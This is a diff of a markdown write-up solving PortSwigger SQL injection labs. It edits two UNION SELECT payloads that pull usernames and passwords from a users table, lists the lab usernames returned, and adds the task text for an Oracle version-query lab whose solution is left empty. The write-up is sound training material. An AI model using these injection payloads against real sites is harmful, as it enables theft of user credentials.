@@ -149,26 +149,34 @@ Like in the previous lab, first we test how many columns there are:
 After that we check that (in my case) the column that is reflected is the second one, and we use that to retrieve the users and passwords:
 
 ```
-# ' UNION SELECT NULL,username FROM users-- -
+' UNION SELECT NULL,username FROM users-- -
 ```
 
 And we get:
 
 ```
 carlos
-
 administrator
-
 wiener
 ```
 
 And then, passwords:
 
 ```
-# ' UNION SELECT NULL,password FROM users-- -
+' UNION SELECT NULL,password FROM users-- -
 ```
 
 And we get:
 
 ![screenshot](../img/bupsuite-sqli6.png)
+
+## SQL injection attack, querying the database type and version on Oracle
+
+### Enuntiation
+
+This lab contains a [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
+
+To solve the lab, display the database version string.
+
+### Solution
 
